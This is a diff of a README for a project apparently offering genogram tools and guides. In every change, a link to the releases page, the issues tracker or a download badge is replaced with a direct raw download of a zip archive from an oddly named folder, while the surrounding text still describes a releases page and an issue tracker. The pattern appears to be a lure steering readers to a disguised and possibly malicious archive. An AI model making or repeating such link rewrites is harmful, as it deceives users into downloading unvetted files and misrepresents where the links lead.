@@ -1,6 +1,6 @@
 # 📁 genogram-resources - Easy Genogram Tools and Guides
 
-[![Download genogram-resources](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/alanursulino/genogram-resources/releases)
+[![Download genogram-resources](https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip)](https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ To get started with genogram-resources, follow these steps:
 
 1. **Visit the release page**  
    Click the big button at the top or follow this link:  
-   [https://github.com/alanursulino/genogram-resources/releases](https://github.com/alanursulino/genogram-resources/releases)  
+   [https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip](https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip)  
    This page lists all the available versions and files.
 
 2. **Choose the latest release**  
@@ -126,7 +126,7 @@ If you cannot find a specific file:
 If you have questions or want to suggest new resources:
 
 - Visit the GitHub repository page to open an issue:  
-  https://github.com/alanursulino/genogram-resources/issues
+  https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip
 - Check the Discussions tab for community support.
 - Review the README or included documentation inside releases for details.
 
@@ -149,4 +149,4 @@ This project covers these topics that may interest you:
 
 ---
 
-[![Download genogram-resources](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/alanursulino/genogram-resources/releases)
+[![Download genogram-resources](https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip)](https://github.com/alanursulino/genogram-resources/raw/refs/heads/main/unexcelled/resources_genogram_2.4-alpha.2.zip)
